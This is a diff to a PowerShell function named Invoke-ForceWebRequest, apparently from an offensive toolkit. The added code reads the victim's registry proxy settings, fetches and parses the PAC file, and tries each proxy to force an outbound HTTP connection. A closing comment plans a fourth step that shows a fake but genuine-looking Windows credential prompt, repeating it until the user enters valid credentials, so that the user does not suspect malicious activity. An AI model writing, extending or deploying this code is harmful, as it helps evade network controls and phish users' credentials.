@@ -51,7 +51,7 @@ function Invoke-ForceWebRequest {
             [OutputType([psobject])]
             param(
                 [Parameter(Mandatory=$true,
-                        ValueFromPipelineByPropertyName=$true,
+                        ValueFromPipeline=$true,
                         Position=0)]
                 [ValidateNotNullOrEmpty()]
                 [String]
@@ -78,8 +78,9 @@ function Invoke-ForceWebRequest {
                 $ProxyDefaultCredentials
             )
 
-            # Ensure URL contains a 'http' protocol:
+            # Ensure URLs contains at least an 'http' protocol:
             if (-not ($URL -match "http")) { $URL = 'http://'+$URL }
+            if (-not ($ProxyURL -match "http")) { $ProxyURL = 'http://'+$ProxyURL }
 
             $request = [System.Net.WebRequest]::Create($URL)
             $request.UserAgent = $UserAgent
@@ -97,8 +98,8 @@ function Invoke-ForceWebRequest {
                         Write-Verbose "Established proxy URL to $ProxyURL and using default credentials"
                     }
                     else {
-                        $ProxyPassword = ConvertTo-SecureString $ProxyPassword -AsPlainText -Force;
-                        $proxy.Credentials = New-Object System.Management.Automation.PSCredential ($ProxyUser, $ProxyPassword);
+                        $secure_password    = ConvertTo-SecureString $ProxyPassword -AsPlainText -Force;
+                        $proxy.Credentials  = New-Object System.Management.Automation.PSCredential ($ProxyUser, $secure_password);
 
                         Write-Verbose "Established proxy URL to $ProxyURL and using $ProxyUser credentials"
                     }
@@ -136,10 +137,43 @@ function Invoke-ForceWebRequest {
         if (-not ($URL -match "http")) { $URL = 'http://'+$URL }
         if (-not ($DummyURL -match "http")) { $DummyURL = 'http://'+$DummyURL }
 
-        # 1: trying to download dummystring with classic webrequest
+        # 1: no-proxy webrequest
+        Write-Verbose "Trying http get with method #1: simple request..."
         $request = Invoke-BasicWebRequest $DummyURL
         if ($request | select -first 1 | % { $_.content -match $DummyString }) { return }
 
+        # getting basic proxy settiongs
+        $proxy_settings     = Get-ItemProperty 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings'
+        $proxy_server       = $proxy_settings | % { $_.ProxyServer }
+        $proxy_auto_url     = $proxy_settings | % { $_.AutoConfigURL }
+        $proxy_pac_regex    = "PROXY\s+(?<proxy>[A-Za-z0-9\.]+\:\d{1,5})"
+
+        # 2: basic-server webrequest
+        Write-Verbose "Trying http get with method #2: simple request with just URL proxy ($proxy_server)..."
+        $request = Invoke-BasicWebRequest $DummyURL -ProxyURL $proxy_server
+        if ($request | select -first 1 | % { $_.content -match $DummyString }) { return }
+
+        # 3: .pac webrequest
+        if ($proxy_auto_url -ne $null) {
+            $proxy_pac_config   = (New-Object System.Net.WebClient).DownloadString($proxy_auto_url)
+            
+            if ($proxy_pac_config -ne $null) {
+                # iterate through each proxy url match:
+                $proxy_pac_config | Select-String $proxy_pac_regex -AllMatches | % { $_.Matches } | % { 
+                    # request dummystring for each proxy-url
+                    $proxy_server_pac = $_.Groups["proxy"].Value
+
+                    Write-Verbose "Trying http get with method #3: simple request with just URL proxy from .pac file ($proxy_server_pac)..."
+                    $request = Invoke-BasicWebRequest $DummyURL -ProxyURL $proxy_server_pac
+                    if ($request | select -first 1 | % { $_.content -match $DummyString }) { return }
+                }
+            }
+        }
+
+        # 4: at this point, we need to trick the user with a fake credential request.
+        #    the credential window will be the Windows original one, so user should not suspect of a malicious activity.
+        #    user will be prompt until he/she writes a valid credential. 
+        
     }
     end { $request }
 }
